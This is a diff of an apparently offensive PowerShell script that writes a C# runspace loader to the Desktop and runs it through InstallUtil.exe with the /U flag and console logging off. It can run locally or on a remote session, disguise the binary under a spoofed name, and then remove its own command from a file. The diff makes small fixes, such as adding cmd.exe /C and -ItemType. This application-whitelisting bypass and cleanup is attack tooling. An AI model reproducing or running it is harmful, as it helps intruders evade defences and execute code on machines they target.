@@ -84,7 +84,7 @@ Write-Host "You have a session open"
 
 #This is where it starts to create the C script and executable for the execution of the function
 $itempath="C:\Users\$env:username\Desktop\standardfile.cs"
-New-Item -Path "C:\Users\$env:username\Desktop\standardfile.cs" -Value "using System;
+New-Item -Path "C:\Users\$env:username\Desktop\standardfile.cs" -ItemType file -Value "using System;
  using System.Configuration.Install;
  using System.Runtime.InteropServices;
  using System.Management.Automation.Runspaces;
@@ -126,7 +126,7 @@ Invoke-Expression -Command $command
 if($Spoof){
 $SpoofContent=Get-Content -Path "$realpath\instalutil.exe" -Encoding Byte
 [System.IO.File]::WriteAllBytes("C:\$env:username\desktop\$Spoofname",$SpoofContent)
-$command2="InstallUtil.exe/logfile=C:\Users\$env:username\Desktop\log.txt /LogToConsole=false /U `"C:\$env:username\desktop\$Spoofname`" "
+$command2="cmd.exe /C InstallUtil.exe/logfile=C:\Users\$env:username\Desktop\log.txt /LogToConsole=false /U `"C:\$env:username\desktop\$Spoofname`" "
 Invoke-Command -Session $session {Invoke-Expression -Command $using:command2}
 $removalstuff=Get-Content -Path $filepath | Out-String
 $removalstuff=$removalstuff.Replace("$Functioncommand","")
@@ -135,7 +135,7 @@ Add-Content -Path $filepath -Value $removalstuff
 }#End Spoof
 
 else{
-$command2="InstallUtil.exe/logfile=C:\Users\fmc\Desktop\log.txt /LogToConsole=false /U `"C:\Users\$env:username\Desktop\standardfile.exe`" "
+$command2="cmd.exe /C InstallUtil.exe/logfile=C:\Users\$env:username\Desktop\log.txt /LogToConsole=false /U `"C:\Users\$env:username\Desktop\standardfile.exe`" "
 Invoke-Command -Session $session {Invoke-Expression -Command $using:command2}
 $removalstuff=Get-Content -Path $filepath | Out-String
 $removalstuff=$removalstuff.Replace("$Functioncommand","")
@@ -147,7 +147,7 @@ Add-Content -Path $filepath -Value $removalstuff
 
 if($LocalHostRan){
 $itempath="C:\Users\$env:username\Desktop\standardfile.cs"
-New-Item -Path "C:\Users\$env:username\Desktop\standardfile.cs" -Value "using System;
+New-Item -Path "C:\Users\$env:username\Desktop\standardfile.cs" -ItemType File -Value "using System;
  using System.Configuration.Install;
  using System.Runtime.InteropServices;
  using System.Management.Automation.Runspaces;
@@ -189,7 +189,7 @@ Invoke-Expression -Command $command
 if($Spoof){
 $SpoofContent=Get-Content -Path "$realpath\instalutil.exe" -Encoding Byte
 [System.IO.File]::WriteAllBytes("C:\$env:username\desktop\$Spoofname",$SpoofContent)
-$command2="InstallUtil.exe/logfile=C:\Users\fmc\Desktop\log.txt /LogToConsole=false /U `"C:\$env:username\desktop\$Spoofname`" "
+$command2="cmd.exe /C InstallUtil.exe/logfile=C:\Users\$env:username\Desktop\log.txt /LogToConsole=false /U `"C:\$env:username\desktop\$Spoofname`" "
 Invoke-Expression -Command $command2
 $removalstuff=Get-Content -Path $filepath | Out-String
 $removalstuff=$removalstuff.Replace("$Functioncommand","")
@@ -198,7 +198,7 @@ Add-Content -Path $filepath -Value $removalstuff
 }#End Spoof
 
 else{
-$command2="InstallUtil.exe/logfile=C:\Users\$env:username\Desktop\log.txt /LogToConsole=false /U `"C:\Users\$env:username\Desktop\standardfile.exe`" "
+$command2="cmd.exe /C InstallUtil.exe/logfile=C:\Users\$env:username\Desktop\log.txt /LogToConsole=false /U `"C:\Users\$env:username\Desktop\standardfile.exe`" "
 Invoke-Expression -Command $command2
 $removalstuff=Get-Content -Path $filepath | Out-String
 $removalstuff=$removalstuff.Replace("$Functioncommand","")
